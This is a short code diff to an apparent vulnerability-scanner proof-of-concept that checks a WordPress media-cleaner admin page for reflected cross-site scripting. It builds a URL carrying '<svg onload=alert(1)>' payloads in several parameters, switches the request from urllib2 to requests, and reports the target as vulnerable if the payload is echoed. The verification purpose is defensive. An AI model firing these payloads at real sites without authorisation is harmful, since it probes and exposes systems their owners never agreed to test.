@@ -36,10 +36,10 @@ class Poc(ABPoc):
             payload = '/wordpress/wp-admin/upload.php?s=test%page=wp-media-cleaner&view="><svg onload=alert(1)>'
             payload += '&paged="><svg onload=alert(1)>&s="><svg onload=alert(1)>'
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
 
-            content = urllib2.urlopen(req).read()
-            if '<svg onload=alert(1)>' in content:
+            req = requests.get(verify_url)
+
+            if '<svg onload=alert(1)>' in req.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
